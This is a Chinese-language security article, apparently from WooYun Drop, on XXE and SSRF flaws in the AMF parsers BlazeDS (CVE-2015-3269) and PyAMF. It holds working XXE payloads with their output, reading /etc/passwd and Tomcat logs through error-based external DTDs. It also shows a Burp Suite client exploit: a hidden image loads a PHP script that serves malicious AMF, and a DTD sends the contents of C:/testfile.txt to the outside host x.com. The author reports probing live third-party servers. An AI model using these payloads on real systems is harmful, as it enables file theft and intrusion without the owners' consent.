FROM WOOYUN DROP. 😭

# 0x00 来源

------

此文译自http://www.agarri.fr/kom/archives/2015/12/17/amf_parsing_and_xxe/index.html、http://codewhitesec.blogspot.sg/2015/08/cve-2015-3269-apache-flex-blazeds-xxe.html，并做了适当的补充。 原作者（以下的“作者”或“原作者”均表示前一篇原始博文作者）最近在把弄两个解析AMF（Action Message Format）的第三方库：BlazeDS和PyAMF。这2个库均受到XXE与SSRF漏洞的影响。作者发现自己所编写的用于BlazeDS的利用代码同样可以用于PyAMF。

首先来看看一个时间轴：

- 2015年3月，BlazeDS 4.7.0由Apache Software Foundation发布，在此之前的版本则是由Adobe所发布。
- 2015年8月，BlazeDS 4.7.1 发布，包含CVE-2015-3269的补丁，该XXE漏洞由Matthias Kaiser（https://twitter.com/matthias_kaiser）所发现。
- 2015年10月，BurpSuite 1.6.29发布，将其所使用的BlazeDS升级至4.7.1，并且默认关闭对AMF的解析。
- 2015年11月，BlazeDS 4.7.2发布，包含CVE-2015-5255的补丁，该SSRF漏洞由James Kettle（https://twitter.com/albinowax）发现。
- 2015年12月，BurpSuite 1.6.31发布，更新BlazeDS至4.7.2版本。
- 2015年12月，PyAMF 0.8版本发布，包含CVE-2015-8549的补丁，该XXE/SSRF漏洞由原博文作者所发现。

# 0x01 CVE-2015-3269

------

该XXE漏洞影响了Apache Flex BlazeDS 4.7.1版本之前的所有版本，使用了这些版本的BlazeDS的软件产品同样也会受到牵连。这里对漏洞细节进行一些描述（来源http://codewhitesec.blogspot.sg/2015/08/cve-2015-3269-apache-flex-blazeds-xxe.html）：

每一条AMF消息均包含一个消息头与一个消息体。BlazeDS里的AmfMessageDeserializer提供了readBody()方法来解析消息体，在这个方法中，首先通过ActionMessageInput 的readUTF()依次取出targetURI与responseURI；随后，通过ActionMessageInput 的readObject()来读取随后的实际内容。

**AmfMessageDeserializer_readBody.java 部分代码**

```
#!java
/*     */   public void readBody(MessageBody body, int index)
/*     */     throws ClassNotFoundException, IOException
/*     */   {
/* 158 */     String targetURI = amfIn.readUTF();
/* 159 */     body.setTargetURI(targetURI);
/* 160 */     String responseURI = amfIn.readUTF();
/* 161 */     body.setResponseURI(responseURI);
/*     */     
/* 163 */     amfIn.readInt();
/*     */     
/* 165 */     amfIn.reset();
/*     */     
/*     */ 
/* 168 */     if (isDebug) {
/* 169 */       debugTrace.startMessage(targetURI, responseURI, index);
/*     */     }
/*     */     Object data;
/*     */     try {
/* 173 */       data = readObject();
/*     */     }
/*     */     catch (RecoverableSerializationException ex)
/*     */     {
/* 177 */       ex.setCode("Client.Message.Encoding");
/* 178 */       data = ex;
/*     */     }
/*     */     catch (MessageException ex)
/*     */     {
/* 182 */       ex.setCode("Client.Message.Encoding");
/* 183 */       throw ex;
/*     */     }
/*     */     
/* 186 */     body.setData(data);
/*     */     
/* 188 */     if (isDebug) {
/* 189 */       debugTrace.endMessage();
/*     */     }
/*     */   }
/*     */   
/*     */ 
/*     */ 
/*     */ 
/*     */   public Object readObject()
/*     */     throws ClassNotFoundException, IOException
/*     */   {
/* 199 */     return amfIn.readObject();
/*     */   }
/*     */ }
```

readObject函数首先读取接下来的一个字节，这个字节代表了即将读取的数据类型，例如：15表示接下来要读取的数据是XML。如果类型XML，那么接下来readXML函数就会被调用，如下代码：

**Amf0Input_readObjectValue.java**

```
#!java
/*     */   public Object readObject()
/*     */     throws ClassNotFoundException, IOException
/*     */   {
/*  91 */     int type = in.readByte();
/*     */     
/*  93 */     Object value = readObjectValue(type);
/*  94 */     return value;
/*     */   }
/*     */   
/*     */   protected Object readObjectValue(int type) throws ClassNotFoundException, IOException
/*     */   {
/*  99 */     Object value = null;
/* 100 */     switch (type)
/*     */     {
/*     */     case 0: 
/* 103 */       value = Double.valueOf(readDouble());
/* 104 */       break;
/*     */     
            ...
/*     */     
/*     */     case 15: 
/* 147 */       value = readXml();
/* 148 */       break;
/*     */     
            ....
/*     */   protected Object readXml() throws IOException
/*     */   {
/* 511 */     String xml = readLongUTF();
/*     */     
/* 513 */     if (isDebug) {
/* 514 */       trace.write(xml);
/*     */     }
/* 516 */     return stringToDocument(xml);
/*     */   }
/*     */   
```

可以看到如上代码最后的readXML实现，xml被传入至stringToDocument方法中，该方法属于XMLUtil类。

**XMLUtil_stringToDocument.java**

```
#!java
/*     */ 
/*     */   public static Document stringToDocument(String xml, boolean nameSpaceAware)
/*     */   {
/* 116 */     ClassUtil.validateCreation(Document.class);
/*     */     
/* 118 */     Document document = null;
/*     */     try
/*     */     {
/* 121 */       if (xml != null)
/*     */       {
/* 123 */         StringReader reader = new StringReader(xml);
/* 124 */         InputSource input = new InputSource(reader);
/* 125 */         DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
/* 126 */         factory.setNamespaceAware(nameSpaceAware);
/* 127 */         factory.setValidating(false);
/* 128 */         DocumentBuilder builder = factory.newDocumentBuilder();
/*     */         
/* 130 */         document = builder.parse(input);
/*     */       }
/*     */     }
/*     */     catch (Exception ex)
/*     */     {
/* 135 */       throw new MessageException("Error deserializing XML type " + ex.getMessage());
/*     */     }
/*     */     
/* 138 */     return document;
/*     */   }
/*     */ }
```

当DocumentBuilder由DocumentBuilderFactory所创建时，外部实体的解析默认情况下是被允许的，开发者需要自己去配置解析器以避免XXE漏洞：（factory.setExpandEntityReferences(false);）。由于上面的代码并没有禁止外部实体的解析，因而产生了XXE。相关可参考：http://security.tencent.com/index.php/blog/msg/69

# 0x02 漏洞利用之一（PyAMF）

------

以下的python脚本（http://www.agarri.fr/docs/amf_srv.py）将会运行一个在线解析AMF的服务，当然你需要安装PyAMF模块，你可以使用`pip install pyamf`来安装，或者是从github获取一份代码（https://github.com/hydralabs/pyamf）后使用`python setup.py install`来安装；Ubuntu下也可以用`apt-get install python-pyamf`。这里，所运行的PyAMF注册了2个服务，其中一个是echo。首先用原作者所编写好的`amf_xxe.py`来对所架设的PyAMF服务进行测试。

```
#!bash
$ ./amf_xxe.py http://192.168.22.201:8081/ echo internal
[+] Target URL: 'http://192.168.22.201:8081/'
[+] Target service: 'echo'
[+] Payload 'internal': '<!DOCTYPE x [ <!ENTITY foo "Some text"> ]><x>Internal entity: &foo;</x>'
[+] Sending the request...
[+] Response code: 200
[+] Body:
........foobar/onResult..null......C<x>Internal entity: Some text</x>
[+] Done
```

可以看到，常规的实体可以被成功解析，再进一步试试外部实体。

```
#!bash
$ ./amf_xxe.py http://192.168.22.201:8081/ echo ext_group
[+] Target URL: 'http://192.168.22.201:8081/'
[+] Target service: 'echo'
[+] Payload 'ext_group': '<!DOCTYPE x [ <!ENTITY foo SYSTEM "file:///etc/group"> ]><x>External entity 1: &foo;</x>'
[+] Sending the request...
[+] Response code: 200
[+] Body:
........foobar/onResult..null.......i<x>External entity 1: root:x:0:
daemon:x:1:
bin:x:2:
[...]
xbot:x:1000:
</x>
[+] Done
```

这说明PyAMF确实存在XXE漏洞，然而实际的生产环境中，我们却很难找到一个接口，会将解析后的XML数据呈现在返回数据中。当然，我们也知道存在不需要回显的XXE利用办法，但是经过作者的测试发现：（1）远程的URL被禁止使用；（2）没有其它一些好用的URL协议；（3）使用了通用的报错信息，使得我们并不能从报错信息里获得有用的信息。即便如此，用这个漏洞来进行拒绝服务还是可行的，例如通过访问`/dev/random`。

```
#!bash
$ ./amf_xxe.py http://192.168.22.201:8081/ wtf ext_rand
[+] Target URL: 'http://192.168.22.201:8081/'
[+] Target service: 'wtf'
[+] Payload 'ext_rand': '<!DOCTYPE x [ <!ENTITY foo SYSTEM "file:///dev/random"> ]><x>External entity 2: &foo;</x>'
[+] Sending the request...
[!] Connection OK, but a timeout was reached...
[+] Done
```

# 0x03 漏洞利用之二 （跑在Java web服务上的BlazeDS）

------

lazeDS 在利用上比PyAMF要相对容易得多，这是因为：（1）我们可以使用一些java所支持的URL协议（比如http、ftp、jar）来对内部网络进行刺探；同时在利用上，我们也可以调用外部的DTD文件；（2）错误信息详细，会泄漏出相关的敏感信息；（3）java上的XXE允许通过file协议来进行列目录，这样十分有利于我们查找我们所感兴趣的文件。与PyAMF一样，我们利用的时候，并不需要知道这个AMF服务器到底注册了哪些可用的服务。

为了方便测试，我们可以在本地搭建测试环境，首先从[http://sourceforge.net/adobe/blazeds/wiki/download%20blazeds%204/](http://sourceforge.net/adobe/blazeds/wiki/download blazeds 4/)这里去下载2011年版本的BlazeDS，原作者下载的是turnkey格式，下载完成解压后，将解压文件放入Tomcat的bin目录中，然后执行`startup.sh`，然后你就可以通过http://127.0.0.1:8400/samples/messagebroker/amf来对BlazeDS进行访问了。我自己所下载的是binary的格式，解压后就是一个war包，自己部署一下，就可以访问了。

部署完成后，就是通过利用脚本`amf_xxe.py`对服务进行测试，效果如下：

```
#!bash
$ ./amf_xxe.py http://127.0.0.1:8400/samples/messagebroker/amf  foo prm_url
[+] Target URL: 'http://127.0.0.1:8400/samples/messagebroker/amf'
[+] Target service: 'foo'
[+] Payload 'prm_url': '<!DOCTYPE x [ <!ENTITY % foo SYSTEM "http://somewhere/blazeds.dtd"> %foo; ]><x>Parameter entity 3</x>'
[+] Sending the request...
[+] Response code: 200
[+] Body:
........foobar/onStatus.......
.Siflex.messaging.messages.ErrorMessage.headers.rootCause body.correlationId.faultDetail.faultString.clientId.timeToLive.destination.timestamp.extendedData.faultCode.messageId
........[Error deserializing XML type no protocol: _://root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
[...]
jetty:x:131:143::/usr/share/jetty:/bin/false
............Bu......../Client.Message.Encoding.I707E4DB6-DB0B-6FED-EC4C-01259078D48B
[+] Done
```

可以看到`/etc/passwd`文件内容被通过报错信息爆出，作者所使用的利用代码中调用了一个外部的DTD文件：http://somewhere/blazeds.dtd，其内容如下：

```
#!bash
<!ENTITY % yolo SYSTEM 'file:///etc/passwd'>
<!ENTITY % c "<!ENTITY &#37; rrr SYSTEM '_://%yolo;'>">
%c;
%rrr;
```

外部DTD中，首先定义了一个参数实体%yolo；然后在参数实体中%c中对其进行了引用；在调用%rrr;时，由于rrr所调用的协议“_”并不被java所支持，导致报错，整个URL全部出现在报错信息中，`/etc/passwd`的内容就藏在其中。同样，还可以用来读取tomcat的日志：

```
#!bash
<!ENTITY % yolo SYSTEM 'file:///proc/self/cwd/../logs/catalina.YYYY-MM-DD.log'>
<!ENTITY % c "<!ENTITY &#37; rrr SYSTEM '_://%yolo;'>">
%c;
%rrr;
```

# 0x04 漏洞利用之三 （使用了BlazeDS的软件产品）

------

原作者在文中提到了，一些软件产品中也使用了BlazeDS，这些产品如果没有升级打补丁，同样也会受到影响。这些软件包括来自Adobe的ColdFusion 和 LiveCycle Data Services，Vmware的vCenter Server, vCloud Director 和Horizon View。为了对这一说法进行验证，我搜索了一台LiveCycle Data Services的服务器，如下图：

![p1](http://drop.zone.ci/images_result/images/20151224000824166481106.png)

抓包得到amf的接口地址，使用利用脚本对该接口进行测试，结果如下图所示：

![p2](http://drop.zone.ci/images_result/images/2015122400082639201249.png)

同样，我又找到一台Vmware的vCloud Director，同样发现存在问题：

![p3](http://drop.zone.ci/images_result/images/2015122400082789429338.png)

# 0x05 漏洞利用之四（使用了BlazeDS的客户端软件）

------

大家常用的BurpSuite就是其中之一，躺枪！虽然最新版本的BurpSuite已经修复了此问题，但是大多数同学手中的版本可能并不是最新版本。根据原作者的说明，一起来看看这个漏洞的效果，由于我本机是windows，所以利用代码是windows的。 首先，创建一个html文件.

```
#!html
<html><body>
Burp Suite + BlazeDS
<img src="http://x.com/test/amf_win.php" style="display:none"/>
</body></html>
```

其中调用的`amf_win.php`内容如下，该代码的作用就是输出一个恶意构造的含有XML的AMF数据：

```
#!php
<?php

function amf_exploit() {
    $header = pack('H*','00030000000100036162630003646566000000ff0a000000010f');
    $xml = '<!DOCTYPE x [ <!ENTITY % dtd SYSTEM "http://x.com/test/dyndtd_win.xml"> %dtd; ]><x/>';
    $xml_sz = pack('N', strlen($xml));
    return ($header . $xml_sz . $xml);  
}

header('Content-Type: application/x-amf');
print(amf_exploit());

?>
```

其中，调用的`dyndtd_win.xml`内容如下，目的就是读取C盘下的testfile.txt，然后发送至我们的服务器x.com上：

```
#!xml
<!ENTITY % yolo SYSTEM 'file:///C:/testfile.txt'>
<!ENTITY % c "<!ENTITY &#37; rrr SYSTEM 'http://x.com/?%yolo;'>">
%c;
%rrr;
```

接着，我们打开BurpSuite，访问我们精心构造的页面进行抓包。

![p4](http://drop.zone.ci/images_result/images/2015122400082971169436.png)

可以看到，我们打开fortest.html后，burp会访问`amf_win.php`，在Wireshark中，我们可以看到我本机的C:\testfile.txt的内容this is a secret!被发送至服务器端。

# 0x06 额外

------

1. 对于BlazeDS，你可以通过 %foo; ]>Parameter entity 3的方法来快速暴露出其所在的程序路径，接着就可以继续通过前面所述的方法来进行目录文件列举，寻找我们感兴趣的文件。如下图所示：

   ![p5](http://drop.zone.ci/images_result/images/2015122400083140285527.png)

2. XXE读取文件内容上的限制使得我们能读取的敏感内容受到限制，具体如何利用该漏洞进行下一步，就看各自的发挥了。

3. 在一些对实际案例的测试（包括腾讯某服务器或是一些vCloud Director服务器）中发现，如果使用外部的DTD，一些服务器返回的错误信息是如下的样子：

   ```
   #!bash
   [!] Connection OK, but a timeout was reached...
   ```

   造成这个错误信息的原因猜测可能是服务器禁止了外部资源的访问。对于这些服务器，无法使用外部DTD，参数实体又只能在外部DTD中被引用，使得上述的报错读取文件的方法变得不可行。不过，通过XXE来进行拒绝服务可能是可行的，由于担心对目标服务器造成不良影响，并未进行进一步的测试。